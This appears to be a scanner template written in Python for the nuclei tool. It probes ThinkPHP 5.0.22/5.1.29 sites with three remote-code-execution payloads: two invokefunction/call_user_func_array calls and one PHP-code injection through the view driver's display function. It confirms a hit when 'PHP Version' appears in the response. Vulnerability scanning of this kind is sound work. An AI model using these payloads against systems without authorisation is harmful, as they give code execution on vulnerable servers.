from nuclei import BaseHTTP,Template
http = BaseHTTP(method="POST")
http.set_paths(
    paths=[
        "{{BaseURL}}/?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
        "{{BaseURL}}/?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
        "{{BaseURL}}/?s=/Index/\\think\\view\\driver\\php/display&content=<?php%20phpinfo();?>"
    ]
)
http.set_body_word_matcher(
    patterns=[
        "PHP Version"
    ]
)
http.dump(
    id="tp5022_5129",
    fingers=[
        "thinkphp"
    ]
)